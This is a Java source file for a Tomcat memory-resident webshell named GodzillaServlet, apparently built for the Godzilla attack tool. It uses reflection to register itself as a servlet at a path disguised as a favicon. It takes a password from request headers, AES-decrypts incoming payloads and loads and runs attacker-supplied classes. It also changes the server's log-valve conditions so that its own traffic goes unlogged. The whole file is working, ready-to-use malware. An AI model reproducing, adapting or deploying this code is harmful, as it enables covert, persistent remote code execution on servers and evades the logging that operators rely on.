
package com.summersec.x;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.ArrayList;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRegistration.Dynamic;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;

public class GodzillaServlet extends ClassLoader implements Servlet {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    String xc = "3c6e0b8a9c15224a";
    public String Pwd = "pass1024";
    public String path = "/favicondemo.ico";
    String md5;
    public String cs;

    public GodzillaServlet() {
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
    }

    public GodzillaServlet(ClassLoader z) {
        super(z);
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
    }

    public Class Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(this.xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception var3) {
        }

        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", (Class[])null).invoke(base64, (Object[])null);
            value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[])null).invoke(base64, (Object[])null);
            value = (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])((byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

    @Override
    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.Pwd = this.request.getHeader("p");
        this.path = this.request.getHeader("path");
        this.md5 = md5(this.Pwd + this.xc);
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addServlet());
        } catch (Exception var7) {
            output.append("error:" + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public String addServlet() throws Exception {
        try {
            ServletContext servletContext = this.request.getServletContext();
            ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade)servletContext;
            Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
            applicationContextField.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext)applicationContextField.get(applicationContextFacade);
            Field standardContextField = applicationContext.getClass().getDeclaredField("context");
            standardContextField.setAccessible(true);
            StandardContext standardContext = (StandardContext)standardContextField.get(applicationContext);
            Wrapper wrapper = standardContext.createWrapper();
            wrapper.setName(this.path);
            standardContext.addChild(wrapper);
            wrapper.setServletClass(this.path);
            wrapper.setServlet(this);
            Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
            registration.addMapping(new String[]{this.path});
            registration.setLoadOnStartup(1);
            if (this.getMethodByClass(wrapper.getClass(), "setServlet", Servlet.class) == null) {
                this.transform(standardContext, this.path);
                this.init((ServletConfig)getFieldValue(wrapper, "facade"));
            }

            return "Success";
        } catch (Exception var9) {
            return var9.getMessage();
        }
    }

    public void service(ServletRequest req, ServletResponse resp) throws ServletException, IOException {
        try {
            HttpServletRequest request = (HttpServletRequest)req;
            HttpServletResponse response = (HttpServletResponse)resp;
            HttpSession session = request.getSession();
            this.noLog((HttpServletRequest)req);
            byte[] data = base64Decode(req.getParameter(this.Pwd));
            data = this.x(data, false);
            if (session.getAttribute("payload") == null) {
                session.setAttribute("payload", (new GodzillaServlet(this.getClass().getClassLoader())).Q(data));
            } else {
                request.setAttribute("parameters", data);
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = ((Class)session.getAttribute("payload")).newInstance();
                f.equals(arrOut);
                f.equals(request);
                response.getWriter().write(this.md5.substring(0, 16));
                f.toString();
                response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                response.getWriter().write(this.md5.substring(16));
            }
        } catch (Exception var9) {
        }

    }

    private void transform(Object standardContext, String path) throws Exception {
        Object containerBase = this.invoke(standardContext, "getParent", (Object[])null);
        Class mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
        Field listenersField = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
        listenersField.setAccessible(true);
        ArrayList listeners = (ArrayList)listenersField.get(containerBase);

        for(int i = 0; i < listeners.size(); ++i) {
            Object mapperListener_Mapper = listeners.get(i);
            if (mapperListener_Mapper != null && mapperListenerClass.isAssignableFrom(mapperListener_Mapper.getClass())) {
                Object mapperListener_Mapper2 = getFieldValue(mapperListener_Mapper, "mapper");
                Object mapperListener_Mapper_hosts = getFieldValue(mapperListener_Mapper2, "hosts");

                for(int j = 0; j < Array.getLength(mapperListener_Mapper_hosts); ++j) {
                    Object mapperListener_Mapper_host = Array.get(mapperListener_Mapper_hosts, j);
                    Object mapperListener_Mapper_hosts_contextList = getFieldValue(mapperListener_Mapper_host, "contextList");
                    Object mapperListener_Mapper_hosts_contextList_contexts = getFieldValue(mapperListener_Mapper_hosts_contextList, "contexts");

                    for(int k = 0; k < Array.getLength(mapperListener_Mapper_hosts_contextList_contexts); ++k) {
                        Object mapperListener_Mapper_hosts_contextList_context = Array.get(mapperListener_Mapper_hosts_contextList_contexts, k);
                        if (standardContext.equals(getFieldValue(mapperListener_Mapper_hosts_contextList_context, "object"))) {
                            new ArrayList();
                            Object standardContext_Mapper = this.invoke(standardContext, "getMapper", (Object[])null);
                            Object standardContext_Mapper_Context = getFieldValue(standardContext_Mapper, "context");
                            Object standardContext_Mapper_Context_exactWrappers = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
                            Object mapperListener_Mapper_hosts_contextList_context_exactWrappers = getFieldValue(mapperListener_Mapper_hosts_contextList_context, "exactWrappers");

                            int l;
                            Object Mapper_Wrapper;
                            Method addWrapperMethod;
                            for(l = 0; l < Array.getLength(mapperListener_Mapper_hosts_contextList_context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(mapperListener_Mapper_hosts_contextList_context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("removeWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path);
                                }
                            }

                            for(l = 0; l < Array.getLength(standardContext_Mapper_Context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(standardContext_Mapper_Context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("addWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class, Object.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path, getFieldValue(Mapper_Wrapper, "object"));
                                }
                            }
                        }
                    }
                }
            }
        }

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        } else {
            f = obj.getClass().getDeclaredField(fieldName);
        }

        f.setAccessible(true);
        f.set(obj, value);
    }

    private Object invoke(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for(int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object)null);
                    }
                }
            }

            Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[])((Class[])classes.toArray(new Class[0])));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while(cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while(cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }

        f.setAccessible(true);
        return f.get(obj);
    }

    private void noLog(HttpServletRequest request) throws Exception {
        Object servletContext = getFieldValue(request.getServletContext(), "context");
        Object standardContext = getFieldValue(servletContext, "context");

        try {
            ArrayList arrayList;
            for(arrayList = new ArrayList(); standardContext != null; standardContext = this.invoke(standardContext, "getParent", (Object[])null)) {
                arrayList.add(standardContext);
            }

            label49:
            for(int i = 0; i < arrayList.size(); ++i) {
                Object pipeline = this.invoke(arrayList.get(i), "getPipeline", (Object[])null);
                if (pipeline != null) {
                    Object valve = this.invoke(pipeline, "getFirst", (Object[])null);

                    while(true) {
                        while(true) {
                            if (valve == null) {
                                continue label49;
                            }

                            if (this.getMethodByClass(valve.getClass(), "getCondition", (Class[])null) != null && this.getMethodByClass(valve.getClass(), "setCondition", String.class) != null) {
                                String condition = (String)this.invoke(valve, "getCondition");
                                condition = condition == null ? "FuckLog" : condition;
                                this.invoke(valve, "setCondition", condition);
                                this.request.setAttribute(condition, condition);
                                valve = this.invoke(valve, "getNext", (Object[])null);
                            } else if (Class.forName("org.apache.catalina.Valve", false, standardContext.getClass().getClassLoader()).isAssignableFrom(valve.getClass())) {
                                valve = this.invoke(valve, "getNext", (Object[])null);
                            } else {
                                valve = null;
                            }
                        }
                    }
                }
            }
        } catch (Exception var9) {
        }

    }

    public void init(ServletConfig servletConfig) throws ServletException {
    }

    public ServletConfig getServletConfig() {
        return null;
    }

    public String getServletInfo() {
        return null;
    }

    public void destroy() {
    }
}
